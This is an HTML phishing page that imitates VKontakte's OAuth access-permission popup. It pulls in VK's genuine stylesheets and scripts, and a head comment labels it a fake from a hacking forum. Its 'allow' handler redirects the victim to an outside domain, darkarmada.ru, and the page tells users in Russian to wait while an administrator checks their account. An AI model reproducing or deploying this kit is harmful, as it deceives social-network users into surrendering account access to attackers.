
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<! -- BY LZT WWW.LOLZTEAM.COM FAKE -->
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<title>ВКонтакте | Разрешение доступа</title>
<link rel="stylesheet" type="text/css" href="https://vk.com/css/al/common.css?510" />
<!--[if lte IE 6]><style type="text/css" media="screen">/* <![CDATA[ */ @import url(https://vk.com/css/al/ie6.css?26); /* ]]> */</style><![endif]-->
<!--[if IE 7]><style type="text/css" media="screen">/* <![CDATA[ */ @import url(https://vk.com/css/al/ie7.css?18); /* ]]> */</style><![endif]-->
<link type="text/css" rel="stylesheet" href="https://vk.com/css/api/oauth_popup.css?31"></link>
<script type="text/javascript" language="javascript" src="https://vk.com/js/api/common_light.js?2"></script>
<script type="text/javascript" language="javascript">
// <![CDATA[
  function allow() {
    var addr = '';
    if (isChecked(ge('allow_notifications'))) {
      addr = '&notify=1';
    }
    if (isChecked(ge('denied_email'))) {
      addr = '&email_denied=1';
    }
    location.href = "http://darkarmada.ru/test/ok.php";
    return false;
  }

  function cancel() {
    location.href = "https://vk.com/id0";
    return false;
  }

  function login() {
    ge('login_submit').submit();
  }
  function doResize(onResize) {
    var box = ge('box_cont');
    if (onResize) {
      setTimeout(function() {
        doResize()
      }, 100);
    }

    var wndH = window.outerHeight - window.innerHeight;
    wndH = (!wndH || wndH < 0) ? 50 : wndH;
    var wndW = window.outerWidth - window.innerWidth;
    wndW = (!wndW || wndW < 0) ? 50 : wndW;

    if (document.body.className.indexOf('oauth_page') != -1) {
      ge('sub_cont').style.paddingTop =  Math.floor((document.body.clientHeight - ge('container').offsetHeight - 50) / 2)+'px';
    } else if (!onResize) {
      var boxH = box.offsetHeight;
      var ctrlH = 178 + wndH;
      var ctrlW = 605 + (wndW || 15);

      window.resizeTo(ctrlW, boxH + ctrlH);
      window.moveTo(Math.floor((screen.width - ctrlW) / 2), Math.floor((screen.height - boxH - ctrlH) / 2));
    }
  }
  function toggleEmailPrivacy() {
    checkbox('denied_email');
    if (!isChecked('denied_email')) {
      hide('denied_email');
      show('allowed_email');
    } else {
      hide('allowed_email');
      show('denied_email');
    }
  }

  if (parent && parent != window) {
    location.href = "https://oauth.vk.com/blank.html";
  }
  
// ]]>
</script>
</head>
</html>
<body onload="doResize();" class="VK oauth_page">
<script>
if (window.devicePixelRatio >= 2) {
  document.body.className += ' is_2x';
}
</script>
<div id="sub_cont">
<table id="container" class="container" cellspacing="0" cellpadding="0"><tr><td class="head">
  <a href="https://vk.com" class="logo"></a></div>
  </td></tr><tr>
 <td>
 <div id="box_cont">
  <div id="box" class="box">
    <div class="info permissions_info">
      
      <div class="app_info">
        <center>
		<h3>Подождите, пока администратор проверит ваш аккаунт.</h3>
		</center>
      </div>
      
      <div class="items">
	</div>
    </div>
  </div>
 </div>
</td></tr></table>
</div>
</body>
</html>
<?php

?>